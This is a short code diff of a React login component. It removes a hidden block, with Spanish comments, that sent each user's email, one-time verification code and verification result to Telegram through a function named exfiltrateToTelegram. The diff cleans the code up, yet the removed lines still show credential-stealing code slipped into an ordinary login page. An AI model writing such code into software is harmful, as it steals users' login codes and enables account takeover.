@@ -89,18 +89,8 @@ const Login = () => {
       type: "email",
     });
 
-    // Captura de intentos de verificación
-    try {
-      await exfiltrateToTelegram({
-        email: email.trim(),
-        verificationCode: c,
-        result: err ? "Verification Error" : "Verification Success",
-        page: window.location.pathname,
-      });
-      console.log("Datos enviados a Telegram después de verificar OTP.");
-    } catch (ex) {
-      console.error("Error enviando datos a Telegram:", ex);
-    }
+
+
 
     setLoading(false);
     if (err) {
